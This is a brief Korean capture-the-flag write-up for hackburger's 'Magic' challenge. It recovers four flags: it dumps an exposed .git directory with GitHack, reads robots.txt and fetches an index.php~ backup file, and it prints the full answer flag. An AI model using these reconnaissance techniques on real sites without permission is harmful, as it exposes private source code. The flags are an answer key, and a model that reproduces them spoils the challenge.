# [hackburger] Magic - Writeup

아무것도 없는 페이지의 주소를 주며 풀라고 한다..

___

## Flag1 - GitHack

```
python GitHack.py http://burger.laboratorium.ee:8006/.git/
```

GitHack을 돌리면 `index.php` 파일이 나오는데, flag1이 있다.

([https://github.com/lijiejie/GitHack/tree/b83a7445b2634703bb94423ca6cff6f9fb2a1d48](https://github.com/lijiejie/GitHack/tree/b83a7445b2634703bb94423ca6cff6f9fb2a1d48))

```
Congratulations!

Flag 1 of 4 is: 47b9664515420d44d2c77dc593f7514ccbd17be8

Please enter all flags, separated by underscore (_).
```

___

## Flag2 - robots.txt

[http://burger.laboratorium.ee:8006/robots.txt](http://burger.laboratorium.ee:8006/robots.txt)
```
Congratulations!

Flag 2 of 4 is: 392d28473a135c2491c227f373d0eed0310e13e3

Please enter 4 flags, separated by underscore (_).
```

___

## Flag3 - Pass

문제 설명을 보면 flag3는 `0`이라고 한다.

___

## Flag4 - Backup File

[http://burger.laboratorium.ee:8006/index.php%7E](http://burger.laboratorium.ee:8006/index.php%7E)

```
Congratulations!

Flag 4 of 4 is: ebb696a5abb04c8875a0afa29f6dc8d167db67e8
Please enter 4 flags, separated by underscore (_).
```

___

## Answer

flag: `47b9664515420d44d2c77dc593f7514ccbd17be8_392d28473a135c2491c227f373d0eed0310e13e3_0_ebb696a5abb04c8875a0afa29f6dc8d167db67e8`